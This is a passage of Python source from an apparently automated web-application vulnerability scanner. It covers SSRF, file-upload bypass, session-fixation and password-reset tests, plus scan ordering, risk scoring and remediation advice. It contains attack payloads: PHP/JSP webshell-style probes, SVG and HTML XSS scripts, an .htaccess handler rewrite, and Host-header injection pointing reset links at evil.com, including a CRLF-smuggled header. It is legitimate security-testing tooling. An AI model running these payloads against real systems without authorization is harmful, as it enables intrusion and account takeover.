                        "security-credentials", "meta-data",
                        "computeMetadata", "project-id",
                    ]
                    if any(ind in body_lower for ind in metadata_indicators):
                        is_vuln = True
                        evidence = f"SSRF: Cloud metadata accessible via {payload_str}"
                        confidence = Confidence.CONFIRMED

                # Check for /etc/passwd (file:// protocol)
                if "file://" in payload_str:
                    if re.search(r"root:[x*!]:\d+:\d+:", body):
                        is_vuln = True
                        evidence = f"SSRF: Local file read via file:// protocol"
                        confidence = Confidence.CONFIRMED

                # Check for internal port scan (connection refused vs timeout)
                if re.search(r":\d+", payload_str):
                    if resp.response_time > baseline.response_time + 3 if baseline.captured else resp.response_time > 5:
                        is_vuln = True
                        evidence = f"SSRF: Internal port scan — timeout suggests port open/filtered on {payload_str}"
                        confidence = Confidence.LOW

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=category,
                        payload=payload_str,
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=body[:2000],
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=confidence,
                        severity=Severity.CRITICAL if confidence == Confidence.CONFIRMED else Severity.HIGH,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(
                        target, category, param_name,
                        param_location, payload_str, resp,
                    )
                    result.poc += f"\n\n# SSRF: Server fetched {payload_str}"

                    results.append(result)
                    self._record_finding(result)
                    self._all_results.append(result)
                    found_vuln = True

            self.state.mark_endpoint_tested(target.url, category.value, {
                "parameter": param_name,
                "vulnerable": found_vuln,
            })

        return results

    # =================================================================
    # FILE UPLOAD SCANNER
    # =================================================================

    async def _scan_file_upload(self, target: ScanTarget) -> List[TestResult]:
        """
        Test file upload endpoints for bypass vulnerabilities.
        """
        results: List[TestResult] = []
        category = ScanCategory.FILE_UPLOAD

        if self._is_tested(target.url, category):
            return results

        # Check if this is a file upload endpoint
        upload_indicators = [
            "upload", "file", "import", "attach",
            "image", "photo", "avatar", "document",
            "media", "asset",
        ]
        url_lower = target.url.lower()
        is_upload = (
            any(ind in url_lower for ind in upload_indicators)
            and target.method in ("POST", "PUT", "PATCH")
        )

        if not is_upload and not self.aggressive:
            return results

        logger.info("File Upload: Testing %s", target.url)
        baseline = self._get_baseline(target)
        found_vuln = False

        # Test payloads for file upload bypass
        upload_tests = [
            {
                "name": "php_double_ext",
                "filename": "test.php.jpg",
                "content": "<?php echo 'VULNERABLE'; ?>",
                "content_type": "image/jpeg",
            },
            {
                "name": "php_null_byte",
                "filename": "test.php%00.jpg",
                "content": "<?php echo 'VULNERABLE'; ?>",
                "content_type": "image/jpeg",
            },
            {
                "name": "svg_xss",
                "filename": "test.svg",
                "content": '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
                "content_type": "image/svg+xml",
            },
            {
                "name": "html_upload",
                "filename": "test.html",
                "content": '<html><body><script>alert("XSS")</script></body></html>',
                "content_type": "text/html",
            },
            {
                "name": "jsp_upload",
                "filename": "test.jsp",
                "content": '<% out.println("VULNERABLE"); %>',
                "content_type": "image/jpeg",
            },
            {
                "name": "exe_as_img",
                "filename": "test.exe",
                "content": "MZ_fake_executable_header",
                "content_type": "image/jpeg",
            },
            {
                "name": "case_bypass",
                "filename": "test.PhP",
                "content": "<?php echo 'VULNERABLE'; ?>",
                "content_type": "image/jpeg",
            },
            {
                "name": "htaccess_upload",
                "filename": ".htaccess",
                "content": "AddType application/x-httpd-php .jpg",
                "content_type": "text/plain",
            },
        ]

        for test in upload_tests:
            if self._cancelled:
                break
            if found_vuln and not self.aggressive:
                break

            try:
                # Build multipart form data
                import io

                file_content = test["content"].encode("utf-8")
                files = {
                    "file": (test["filename"], io.BytesIO(file_content), test["content_type"]),
                }

                # Use httpx directly for multipart upload
                resp = await self._send_raw_request(
                    method="POST",
                    url=target.url,
                    data={"file": file_content},
                    headers={
                        "Content-Type": f'multipart/form-data; boundary=----WebKitFormBoundary',
                    },
                )
                self._update_progress(category, target.url)

                if not resp:
                    continue

                # Check if upload was accepted
                if resp.status_code in (200, 201):
                    body_lower = resp.text.lower() if resp.text else ""

                    # Check for upload success indicators
                    if any(kw in body_lower for kw in [
                        "success", "uploaded", "created", "url", "path", "location",
                    ]):
                        evidence = (
                            f"File upload bypass ({test['name']}): "
                            f"uploaded '{test['filename']}' as {test['content_type']}, "
                            f"server returned HTTP {resp.status_code}"
                        )

                        # Try to find the uploaded file URL
                        upload_url = ""
                        if resp.is_json and resp.json_data:
                            data = resp.json_data
                            if isinstance(data, dict):
                                for key in ("url", "path", "location", "file", "link"):
                                    if key in data:
                                        upload_url = str(data[key])
                                        break

                        if upload_url:
                            evidence += f" | File accessible at: {upload_url}"

                        result = TestResult(
                            target=target,
                            category=category,
                            payload=test["filename"],
                            parameter="file_upload",
                            request_url=target.url,
                            request_method="POST",
                            response_status=resp.status_code,
                            response_body=resp.text[:2000] if resp.text else "",
                            response_time=resp.response_time,
                            response_size=resp.content_length,
                            is_vulnerable=True,
                            confidence=Confidence.HIGH,
                            severity=Severity.HIGH,
                            evidence=evidence,
                        )
                        result.poc = (
                            f"curl -X POST '{target.url}' "
                            f"-F 'file=@{test[\"filename\"]};type={test[\"content_type\"]}'"
                        )
                        if self._auth_token:
                            result.poc += f" -H 'Authorization: Bearer {self._auth_token}'"
                        result.poc += f"\n\n# File upload bypass: {test['name']}"
                        result.poc += f"\n# Filename: {test['filename']}"
                        result.poc += f"\n# Declared Content-Type: {test['content_type']}"
                        result.poc += f"\n# Actual content: {test['content'][:50]}..."

                        results.append(result)
                        self._record_finding(result)
                        self._all_results.append(result)
                        found_vuln = True

            except Exception as exc:
                logger.debug("File upload test error (%s): %s", test["name"], str(exc))

        self.state.mark_endpoint_tested(target.url, category.value, {
            "tests_run": len(upload_tests),
            "vulnerable": found_vuln,
        })

        return results
    
        # =================================================================
    # SESSION FIXATION SCANNER
    # =================================================================

    async def _scan_session_fixation(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for session fixation vulnerabilities:
        1. Set a known session ID before login.
        2. Login and check if session ID changed.
        3. If session ID remains the same → vulnerable.
        """
        results: List[TestResult] = []
        category = ScanCategory.SESSION_FIXATION

        login_url = self.state.get_login_endpoint()
        if not login_url:
            return results

        if self._is_tested(login_url, category):
            return results

        found_vuln = False

        try:
            # Step 1: Set a known session cookie
            fixed_session_id = "FIXATED_SESSION_12345ABCDE"
            session_cookie_names = [
                "session", "sessionid", "JSESSIONID",
                "PHPSESSID", "ASP.NET_SessionId", "connect.sid",
                "sid", "token",
            ]

            for cookie_name in session_cookie_names:
                if self._cancelled:
                    break

                # Navigate to site with fixed session
                try:
                    await self.browser.clear_cookies()
                    await self.browser.set_cookies([{
                        "name": cookie_name,
                        "value": fixed_session_id,
                        "url": self.target_url,
                    }])

                    # Navigate to login page
                    page_data = await self.browser.navigate(login_url, wait_for="networkidle")
                    self._update_progress(category, login_url)

                    # Get cookies before login
                    cookies_before = await self.browser.get_cookies()
                    session_before = None
                    for c in cookies_before:
                        if c.get("name", "").lower() == cookie_name.lower():
                            session_before = c.get("value")
                            break

                    if session_before and session_before == fixed_session_id:
                        # Server accepted our fixed session — now try to login
                        creds = self.state.get_all_credentials()
                        if creds:
                            cred = creds[0]
                            username = cred.get("username", "")
                            password = cred.get("password", "")

                            if username and password:
                                # Find login form and submit
                                login_forms = await self.browser._extract_forms_from_dom()
                                for form in login_forms:
                                    if form.has_password_field:
                                        form_data = {}
                                        for f_field in form.fields:
                                            if f_field.field_type == "password" or "pass" in f_field.name.lower():
                                                form_data[f_field.name] = password
                                            elif f_field.field_type == "email" or "email" in f_field.name.lower() or "user" in f_field.name.lower():
                                                form_data[f_field.name] = username
                                            elif f_field.value:
                                                form_data[f_field.name] = f_field.value

                                        if form_data:
                                            await self.browser.submit_form(
                                                form.selector or "form",
                                                form_data,
                                            )
                                            await asyncio.sleep(2)
                                            break

                                # Check cookies after login
                                cookies_after = await self.browser.get_cookies()
                                session_after = None
                                for c in cookies_after:
                                    if c.get("name", "").lower() == cookie_name.lower():
                                        session_after = c.get("value")
                                        break

                                if session_after and session_after == fixed_session_id:
                                    # Session NOT regenerated after login → VULNERABLE
                                    evidence = (
                                        f"Session fixation: cookie '{cookie_name}' was set to "
                                        f"'{fixed_session_id}' before login and remained the SAME "
                                        f"after successful login. Session is not regenerated."
                                    )

                                    result = TestResult(
                                        target=ScanTarget(url=login_url, method="POST"),
                                        category=category,
                                        payload=f"{cookie_name}={fixed_session_id}",
                                        parameter=cookie_name,
                                        request_url=login_url,
                                        request_method="POST",
                                        response_status=200,
                                        is_vulnerable=True,
                                        confidence=Confidence.CONFIRMED,
                                        severity=Severity.HIGH,
                                        evidence=evidence,
                                    )
                                    result.poc = (
                                        f"# Session Fixation PoC:\n"
                                        f"# 1. Set cookie: {cookie_name}={fixed_session_id}\n"
                                        f"# 2. Login at {login_url}\n"
                                        f"# 3. Cookie remains: {cookie_name}={fixed_session_id}\n"
                                        f"# 4. Attacker can use the fixed session to hijack"
                                    )

                                    results.append(result)
                                    self._record_finding(result)
                                    self._all_results.append(result)
                                    found_vuln = True
                                    break

                except Exception as exc:
                    logger.debug("Session fixation test error for %s: %s", cookie_name, str(exc))

                if found_vuln:
                    break

        except Exception as exc:
            logger.debug("Session fixation scan error: %s", str(exc))

        self.state.mark_endpoint_tested(login_url or self.target_url, category.value, {
            "vulnerable": found_vuln,
        })

        return results

    # =================================================================
    # PASSWORD RESET MANIPULATION SCANNER
    # =================================================================

    async def _scan_password_reset(self) -> List[TestResult]:
        """
        Test password reset functionality for vulnerabilities:
        1. Reset other users' passwords.
        2. Token prediction.
        3. Host header manipulation.
        """
        results: List[TestResult] = []
        category = ScanCategory.PASSWORD_RESET

        # Find password reset endpoint
        reset_endpoints: List[str] = []
        for ep in self.state.get_all_endpoints():
            url_lower = ep.get("url", "").lower()
            if any(kw in url_lower for kw in [
                "reset", "forgot", "recover", "password",
            ]):
                if ep.get("method", "GET").upper() in ("POST", "PUT", "PATCH"):
                    reset_endpoints.append(ep.get("url", ""))

        if not reset_endpoints:
            # Try common reset paths
            common_reset_paths = [
                "/api/Users/forgot-password",
                "/api/forgot-password",
                "/rest/user/reset-password",
                "/api/v1/password/reset",
                "/forgot-password",
                "/reset-password",
            ]
            for path in common_reset_paths:
                full_url = urljoin(self.target_url + "/", path.lstrip("/"))
                resp = await self._send_raw_request("POST", full_url, json_data={"email": "test@test.com"})
                if resp and resp.status_code not in (404, 405):
                    reset_endpoints.append(full_url)
                    break

        if not reset_endpoints:
            return results

        found_vuln = False

        for reset_url in reset_endpoints:
            if self._cancelled:
                break

            if self._is_tested(reset_url, category):
                continue

            # === Test 1: Host header manipulation ===
            test_bodies = [
                {"email": "admin@juice-sh.op"},
                {"email": "test@test.com"},
                {"username": "admin"},
            ]

            for body in test_bodies:
                if self._cancelled:
                    break

                # Normal request
                normal_resp = await self._send_raw_request(
                    "POST", reset_url, json_data=body,
                )
                self._update_progress(category, reset_url)

                if not normal_resp:
                    continue

                # Host header manipulation
                evil_host_headers = [
                    {"Host": "evil.com"},
                    {"Host": f"{self.target_host}\r\nX-Forwarded-Host: evil.com"},
                    {"X-Forwarded-Host": "evil.com"},
                    {"X-Original-URL": "http://evil.com/reset"},
                ]

                for evil_headers in evil_host_headers:
                    if self._cancelled:
                        break

                    resp = await self._send_raw_request(
                        "POST", reset_url,
                        json_data=body,
                        headers=evil_headers,
                    )
                    self._update_progress(category, reset_url)

                    if not resp:
                        continue

                    # If server processes the request with our evil host
                    if resp.status_code in (200, 201, 204):
                        body_text = resp.text.lower() if resp.text else ""
                        if any(kw in body_text for kw in [
                            "success", "sent", "email", "reset link",
                            "check your email", "instructions",
                        ]):
                            header_name = list(evil_headers.keys())[0]
                            header_value = list(evil_headers.values())[0]

                            evidence = (
                                f"Password reset host header injection: "
                                f"request with {header_name}: {header_value} "
                                f"was accepted (HTTP {resp.status_code}). "
                                f"Reset link may point to attacker domain."
                            )

                            result = TestResult(
                                target=ScanTarget(url=reset_url, method="POST"),
                                category=category,
                                payload=f"{header_name}:{header_value}",
                                parameter=header_name,
                                request_url=reset_url,
                                request_method="POST",
                                request_body=body,
                                response_status=resp.status_code,
                                response_body=resp.text[:2000] if resp.text else "",
                                response_time=resp.response_time,
                                response_size=resp.content_length,
                                is_vulnerable=True,
                                confidence=Confidence.MEDIUM,
                                severity=Severity.HIGH,
                                evidence=evidence,
                            )
                            result.poc = (
                                f"curl -X POST '{reset_url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-H '{header_name}: {header_value}' "
                                f"-d '{json.dumps(body)}'"
                            )
                            result.poc += f"\n\n# Password reset link will be sent to attacker's domain"

                            results.append(result)
                            self._record_finding(result)
                            self._all_results.append(result)
                            found_vuln = True
                            break

                if found_vuln:
                    break

            self.state.mark_endpoint_tested(reset_url, category.value, {
                "vulnerable": found_vuln,
            })

        return results

    # =================================================================
    # CATEGORY DISPATCHER
    # =================================================================

    async def _run_category(self, category: ScanCategory) -> List[TestResult]:
        """
        Dispatch scanning for a specific vulnerability category.
        Routes to the appropriate scanner method.
        """
        results: List[TestResult] = []

        logger.info("=" * 60)
        logger.info("SCANNING CATEGORY: %s", category.value.upper())
        logger.info("=" * 60)

        self._progress.current_category = category.value

        try:
            if category == ScanCategory.FORCED_BROWSING:
                results = await self._scan_forced_browsing()

            elif category == ScanCategory.SECURITY_HEADERS:
                results = await self._scan_security_headers()

            elif category == ScanCategory.DEFAULT_CREDS:
                results = await self._scan_default_creds()

            elif category == ScanCategory.SESSION_FIXATION:
                # Pick any target or use login URL
                login_url = self.state.get_login_endpoint()
                if login_url:
                    dummy_target = ScanTarget(url=login_url, method="POST")
                    results = await self._scan_session_fixation(dummy_target)

            elif category == ScanCategory.PASSWORD_RESET:
                results = await self._scan_password_reset()

            else:
                # Per-endpoint categories — run against all scan targets
                if category in (
                    ScanCategory.SQLI,
                    ScanCategory.XSS,
                    ScanCategory.NOSQL,
                    ScanCategory.CMD_INJECTION,
                    ScanCategory.INPUT_VALIDATION,
                    ScanCategory.PATH_TRAVERSAL,
                    ScanCategory.SSRF,
                ):
                    results = await self._run_injection_category(category)

                elif category in (
                    ScanCategory.IDOR,
                    ScanCategory.PRIVILEGE_ESCALATION,
                    ScanCategory.AUTH_BYPASS,
                ):
                    results = await self._run_access_control_category(category)

                elif category == ScanCategory.XXE:
                    results = await self._run_xxe_category()

                elif category == ScanCategory.JWT_ATTACK:
                    results = await self._run_jwt_category()

                elif category == ScanCategory.FILE_UPLOAD:
                    results = await self._run_file_upload_category()

                elif category == ScanCategory.BRUTE_FORCE:
                    # Handled via default_creds
                    pass

        except Exception as exc:
            logger.error(
                "Error in category %s: %s\n%s",
                category.value, str(exc), traceback.format_exc(),
            )
            self._progress.errors += 1

        self._mark_category_complete(category)

        findings_count = sum(1 for r in results if r.is_vulnerable)
        logger.info(
            "CATEGORY COMPLETE: %s | findings=%d | total_results=%d",
            category.value.upper(), findings_count, len(results),
        )

        return results

    # =================================================================
    # PER-ENDPOINT CATEGORY RUNNERS
    # =================================================================

    async def _run_injection_category(self, category: ScanCategory) -> List[TestResult]:
        """
        Run an injection-type scan across all targets.
        Uses semaphore for controlled concurrency.
        """
        results: List[TestResult] = []

        scanner_map = {
            ScanCategory.SQLI: self._scan_sqli,
            ScanCategory.XSS: self._scan_xss,
            ScanCategory.NOSQL: self._scan_nosql,
            ScanCategory.CMD_INJECTION: self._scan_cmd_injection,
            ScanCategory.INPUT_VALIDATION: self._scan_input_validation,
            ScanCategory.PATH_TRAVERSAL: self._scan_path_traversal,
            ScanCategory.SSRF: self._scan_ssrf,
        }

        scanner_func = scanner_map.get(category)
        if not scanner_func:
            return results

        # Filter targets that haven't been tested for this category
        targets_to_scan = []
        for target in self._scan_targets:
            if not self.state.is_endpoint_tested(target.url, category.value):
                targets_to_scan.append(target)

        if not targets_to_scan:
            logger.info("%s: All endpoints already tested, skipping", category.value)
            return results

        logger.info(
            "%s: Scanning %d endpoints (of %d total)",
            category.value, len(targets_to_scan), len(self._scan_targets),
        )

        async def scan_with_semaphore(t: ScanTarget) -> List[TestResult]:
            async with self._semaphore:
                if self._cancelled:
                    return []
                try:
                    return await scanner_func(t)
                except Exception as exc:
                    logger.error(
                        "%s scan error on %s: %s",
                        category.value, t.url, str(exc),
                    )
                    self._progress.errors += 1
                    return []

        tasks = [scan_with_semaphore(t) for t in targets_to_scan]
        all_results = await asyncio.gather(*tasks, return_exceptions=True)

        for batch in all_results:
            if isinstance(batch, list):
                results.extend(batch)
            elif isinstance(batch, Exception):
                logger.error("%s batch error: %s", category.value, str(batch))
                self._progress.errors += 1

        self._progress.scanned_endpoints += len(targets_to_scan)
        return results

    async def _run_access_control_category(self, category: ScanCategory) -> List[TestResult]:
        """
        Run access-control scans (IDOR, PrivEsc, Auth Bypass) across targets.
        Sequential execution to avoid interfering with auth state.
        """
        results: List[TestResult] = []

        scanner_map = {
            ScanCategory.IDOR: self._scan_idor,
            ScanCategory.PRIVILEGE_ESCALATION: self._scan_privilege_escalation,
            ScanCategory.AUTH_BYPASS: self._scan_auth_bypass,
        }

        scanner_func = scanner_map.get(category)
        if not scanner_func:
            return results

        targets_to_scan = []
        for target in self._scan_targets:
            if not self.state.is_endpoint_tested(target.url, category.value):
                targets_to_scan.append(target)

        if not targets_to_scan:
            logger.info("%s: All endpoints already tested, skipping", category.value)
            return results

        logger.info(
            "%s: Scanning %d endpoints sequentially",
            category.value, len(targets_to_scan),
        )

        for target in targets_to_scan:
            if self._cancelled:
                break
            try:
                target_results = await scanner_func(target)
                results.extend(target_results)
            except Exception as exc:
                logger.error(
                    "%s scan error on %s: %s",
                    category.value, target.url, str(exc),
                )
                self._progress.errors += 1

        self._progress.scanned_endpoints += len(targets_to_scan)
        return results

    async def _run_xxe_category(self) -> List[TestResult]:
        """
        Run XXE scans on endpoints that accept XML or POST data.
        """
        results: List[TestResult] = []

        targets = [
            t for t in self._scan_targets
            if t.method in ("POST", "PUT", "PATCH")
            and not self.state.is_endpoint_tested(t.url, ScanCategory.XXE.value)
        ]

        if not targets:
            return results

        logger.info("XXE: Scanning %d POST/PUT/PATCH endpoints", len(targets))

        for target in targets:
            if self._cancelled:
                break
            try:
                target_results = await self._scan_xxe(target)
                results.extend(target_results)
            except Exception as exc:
                logger.error("XXE scan error on %s: %s", target.url, str(exc))
                self._progress.errors += 1

        return results

    async def _run_jwt_category(self) -> List[TestResult]:
        """
        Run JWT attacks using the first authenticated endpoint.
        """
        results: List[TestResult] = []

        if not self._auth_token or not self._looks_like_jwt(self._auth_token):
            logger.info("JWT: No JWT token available, skipping")
            return results

        # Pick a representative authenticated endpoint
        auth_endpoints = self.state.get_endpoints_requiring_auth()
        if not auth_endpoints:
            # Use first available endpoint
            all_eps = self.state.get_all_endpoints()
            auth_endpoints = all_eps[:3] if all_eps else []

        if not auth_endpoints:
            return results

        # Test against first endpoint only (JWT vuln is token-level, not endpoint-level)
        ep = auth_endpoints[0]
        url = ep.get("url", "")
        if not url.startswith(("http://", "https://")):
            url = urljoin(self.target_url + "/", url.lstrip("/"))

        target = ScanTarget(
            url=url,
            method=ep.get("method", "GET"),
            params=ep.get("params", {}),
            requires_auth=True,
        )

        try:
            target_results = await self._scan_jwt_attacks(target)
            results.extend(target_results)
        except Exception as exc:
            logger.error("JWT scan error: %s", str(exc))
            self._progress.errors += 1

        return results

    async def _run_file_upload_category(self) -> List[TestResult]:
        """
        Run file upload scans on endpoints that look like upload handlers.
        """
        results: List[TestResult] = []

        upload_indicators = [
            "upload", "file", "import", "attach",
            "image", "photo", "avatar", "document",
            "media", "asset",
        ]

        targets = [
            t for t in self._scan_targets
            if t.method in ("POST", "PUT", "PATCH")
            and any(ind in t.url.lower() for ind in upload_indicators)
            and not self.state.is_endpoint_tested(t.url, ScanCategory.FILE_UPLOAD.value)
        ]

        # If aggressive mode, also try all POST endpoints
        if self.aggressive and not targets:
            targets = [
                t for t in self._scan_targets
                if t.method == "POST"
                and not self.state.is_endpoint_tested(t.url, ScanCategory.FILE_UPLOAD.value)
            ][:5]  # Limit to 5 in aggressive mode

        if not targets:
            return results

        logger.info("File Upload: Scanning %d upload endpoints", len(targets))

        for target in targets:
            if self._cancelled:
                break
            try:
                target_results = await self._scan_file_upload(target)
                results.extend(target_results)
            except Exception as exc:
                logger.error("File upload scan error on %s: %s", target.url, str(exc))
                self._progress.errors += 1

        return results

    # =================================================================
    # SCAN ORDERING / PRIORITY
    # =================================================================

    def _get_ordered_categories(self) -> List[ScanCategory]:
        """
        Return scan categories in optimal execution order.

        Order rationale:
        1. Security headers — fast, non-intrusive, immediate info
        2. Forced browsing — discovers new endpoints for later tests
        3. Default creds — if we find creds, we can do authenticated tests
        4. Auth bypass — find auth issues early
        5. JWT attacks — if JWT found, test it early (feeds into priv esc)
        6. IDOR — needs auth, important access control check
        7. Privilege escalation — needs auth
        8. SQLi — main injection test, may reveal data
        9. XSS — common vuln, important to test
        10. NoSQL — if NoSQL detected
        11. Command injection — dangerous, test carefully
        12. Input validation — broader coverage
        13. Path traversal — file access
        14. XXE — XML specific
        15. SSRF — URL parameter specific
        16. File upload — upload endpoint specific
        17. Session fixation — needs browser
        18. Password reset — specific to reset flow
        """
        priority_order = [
            ScanCategory.SECURITY_HEADERS,
            ScanCategory.FORCED_BROWSING,
            ScanCategory.DEFAULT_CREDS,
            ScanCategory.AUTH_BYPASS,
            ScanCategory.JWT_ATTACK,
            ScanCategory.IDOR,
            ScanCategory.PRIVILEGE_ESCALATION,
            ScanCategory.SQLI,
            ScanCategory.XSS,
            ScanCategory.NOSQL,
            ScanCategory.CMD_INJECTION,
            ScanCategory.INPUT_VALIDATION,
            ScanCategory.PATH_TRAVERSAL,
            ScanCategory.XXE,
            ScanCategory.SSRF,
            ScanCategory.FILE_UPLOAD,
            ScanCategory.SESSION_FIXATION,
            ScanCategory.PASSWORD_RESET,
        ]

        # Filter to only requested categories
        ordered = [c for c in priority_order if c in self.categories]

        # Add any remaining categories not in priority list
        for c in self.categories:
            if c not in ordered:
                ordered.append(c)

        return ordered

    # =================================================================
    # SUMMARY / REPORT GENERATION
    # =================================================================

    def _generate_scan_summary(self) -> Dict[str, Any]:
        """
        Generate a comprehensive scan summary with all findings,
        statistics, and recommendations.
        """
        # Group findings by category
        findings_by_category: Dict[str, List[Dict]] = {}
        for result in self._findings:
            if not result.is_vulnerable:
                continue
            cat = result.category.value if isinstance(result.category, ScanCategory) else str(result.category)
            if cat not in findings_by_category:
                findings_by_category[cat] = []
            findings_by_category[cat].append(result.to_dict())

        # Group findings by severity
        findings_by_severity: Dict[str, int] = {
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0,
            "info": 0,
        }
        for result in self._findings:
            if result.is_vulnerable:
                sev = result.severity.value if isinstance(result.severity, Severity) else str(result.severity)
                findings_by_severity[sev] = findings_by_severity.get(sev, 0) + 1

        # Group findings by confidence
        findings_by_confidence: Dict[str, int] = {
            "confirmed": 0,
            "high": 0,
            "medium": 0,
            "low": 0,
            "tentative": 0,
        }
        for result in self._findings:
            if result.is_vulnerable:
                conf = result.confidence.value if isinstance(result.confidence, Confidence) else str(result.confidence)
                findings_by_confidence[conf] = findings_by_confidence.get(conf, 0) + 1

        # Unique vulnerable endpoints
        vuln_endpoints: Set[str] = set()
        for result in self._findings:
            if result.is_vulnerable:
                vuln_endpoints.add(result.request_url)

        # Calculate risk score (0-100)
        risk_score = self._calculate_risk_score()

        # Generate recommendations
        recommendations = self._generate_scan_recommendations()

        # Top findings (most critical)
        top_findings = sorted(
            [r.to_dict() for r in self._findings if r.is_vulnerable],
            key=lambda x: {
                "critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4,
            }.get(x.get("severity", "info"), 5),
        )[:10]

        summary = {
            "scan_info": {
                "target": self.target_url,
                "start_time": self._progress.start_time,
                "end_time": time.time(),
                "duration_seconds": self._progress.elapsed_time,
                "duration_human": self._format_duration(self._progress.elapsed_time),
                "categories_scanned": self._progress.categories_completed,
                "categories_remaining": self._progress.categories_remaining,
                "scan_mode": "aggressive" if self.aggressive else "normal",
                "ai_analysis_enabled": self.use_ai,
                "waf_detected": self._waf_detected,
                "authenticated": bool(self._auth_token or self._auth_cookies),
            },
            "statistics": {
                "total_endpoints_scanned": self._progress.scanned_endpoints,
                "total_tests_executed": self._progress.completed_tests,
                "total_requests_sent": self.state.get_statistics().get("total_requests", 0),
                "total_findings": self._progress.total_findings,
                "confirmed_findings": self._progress.confirmed_findings,
                "potential_findings": self._progress.potential_findings,
                "unique_vulnerable_endpoints": len(vuln_endpoints),
                "errors_encountered": self._progress.errors,
            },
            "risk_score": risk_score,
            "risk_level": self._risk_level_from_score(risk_score),
            "findings_by_severity": findings_by_severity,
            "findings_by_confidence": findings_by_confidence,
            "findings_by_category": {
                cat: len(findings)
                for cat, findings in findings_by_category.items()
            },
            "top_findings": top_findings,
            "all_findings": [r.to_dict() for r in self._findings if r.is_vulnerable],
            "recommendations": recommendations,
            "vulnerable_endpoints": sorted(vuln_endpoints),
        }

        return summary

    def _calculate_risk_score(self) -> int:
        """
        Calculate overall risk score from 0 (safe) to 100 (critical).
        """
        if not self._findings:
            return 0

        score = 0
        severity_weights = {
            "critical": 25,
            "high": 15,
            "medium": 8,
            "low": 3,
            "info": 1,
        }
        confidence_multipliers = {
            "confirmed": 1.0,
            "high": 0.8,
            "medium": 0.5,
            "low": 0.3,
            "tentative": 0.1,
        }

        for result in self._findings:
            if not result.is_vulnerable:
                continue

            sev = result.severity.value if isinstance(result.severity, Severity) else str(result.severity)
            conf = result.confidence.value if isinstance(result.confidence, Confidence) else str(result.confidence)

            weight = severity_weights.get(sev, 1)
            multiplier = confidence_multipliers.get(conf, 0.1)

            score += weight * multiplier

        # Normalize to 0-100
        # With 4+ critical confirmed findings, should be near 100
        normalized = min(100, int(score))
        return normalized

    @staticmethod
    def _risk_level_from_score(score: int) -> str:
        """Convert risk score to human-readable level."""
        if score >= 80:
            return "CRITICAL"
        elif score >= 60:
            return "HIGH"
        elif score >= 40:
            return "MEDIUM"
        elif score >= 20:
            return "LOW"
        else:
            return "INFORMATIONAL"

    @staticmethod
    def _format_duration(seconds: float) -> str:
        """Format seconds into human-readable duration."""
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            mins = int(seconds // 60)
            secs = int(seconds % 60)
            return f"{mins}m {secs}s"
        else:
            hours = int(seconds // 3600)
            mins = int((seconds % 3600) // 60)
            return f"{hours}h {mins}m"

    def _generate_scan_recommendations(self) -> List[Dict[str, str]]:
        """
        Generate actionable recommendations based on findings.
        """
        recommendations: List[Dict[str, str]] = []
        found_categories: Set[str] = set()

        for result in self._findings:
            if not result.is_vulnerable:
                continue
            cat = result.category.value if isinstance(result.category, ScanCategory) else str(result.category)
            found_categories.add(cat)

        recommendation_map = {
            "sqli": {
                "title": "SQL Injection Remediation",
                "priority": "CRITICAL",
                "description": (
                    "Use parameterized queries (prepared statements) for all database interactions. "
                    "Never concatenate user input into SQL strings. "
                    "Implement input validation and use ORM frameworks. "
                    "Apply least-privilege database accounts."
                ),
            },
            "xss": {
                "title": "Cross-Site Scripting (XSS) Remediation",
                "priority": "HIGH",
                "description": (
                    "Encode all output data using context-aware encoding (HTML, JS, URL, CSS). "
                    "Implement Content Security Policy (CSP) headers. "
                    "Use modern frameworks with auto-escaping (React, Angular, Vue). "
                    "Sanitize HTML input with a whitelist-based sanitizer."
                ),
            },
            "nosql": {
                "title": "NoSQL Injection Remediation",
                "priority": "CRITICAL",
                "description": (
                    "Validate and sanitize all user input before using in NoSQL queries. "
                    "Use type checking to prevent operator injection ($gt, $ne, etc.). "
                    "Implement proper input validation on the server side."
                ),
            },
            "cmd_injection": {
                "title": "Command Injection Remediation",
                "priority": "CRITICAL",
                "description": (
                    "Avoid executing OS commands with user-supplied input entirely. "
                    "If unavoidable, use whitelisting and parameterized commands. "
                    "Never pass user input to shell interpreters."
                ),
            },
            "idor": {
                "title": "IDOR / Access Control Remediation",
                "priority": "HIGH",
                "description": (
                    "Implement proper authorization checks on every request. "
                    "Verify that the authenticated user has permission to access the requested resource. "
                    "Use indirect references (mapping tables) instead of direct object IDs. "
                    "Implement role-based access control (RBAC)."
                ),
            },
            "privilege_escalation": {
                "title": "Privilege Escalation Remediation",
                "priority": "CRITICAL",
                "description": (
                    "Enforce role-based access control on all admin endpoints. "
                    "Never trust client-supplied role or permission fields. "
                    "Validate roles server-side from the authenticated session. "
                    "Implement proper authorization middleware."
                ),
            },
            "forced_browsing": {
                "title": "Forced Browsing Remediation",
                "priority": "MEDIUM",
                "description": (
                    "Implement proper access controls on all endpoints. "
                    "Remove or restrict access to admin panels, debug endpoints, and API docs. "
                    "Use authentication and authorization middleware globally. "
                    "Remove unnecessary files and directories from production."
                ),
            },
            "auth_bypass": {
                "title": "Authentication Bypass Remediation",
                "priority": "CRITICAL",
                "description": (
                    "Implement authentication checks on all protected endpoints. "
                    "Validate tokens server-side for every request. "
                    "Don't rely on client-side headers for access control. "
                    "Enforce consistent authentication across all HTTP methods."
                ),
            },
            "jwt_attack": {
                "title": "JWT Security Remediation",
                "priority": "CRITICAL",
                "description": (
                    "Use strong, unique secrets for JWT signing (256+ bit). "
                    "Reject tokens with 'none' algorithm. "
                    "Validate algorithm in token matches expected algorithm. "
                    "Implement token expiration and refresh mechanisms. "
                    "Consider using asymmetric algorithms (RS256)."
                ),
            },
            "security_headers": {
                "title": "Security Headers Configuration",
                "priority": "MEDIUM",
                "description": (
                    "Add missing security headers: X-Frame-Options, X-Content-Type-Options, "
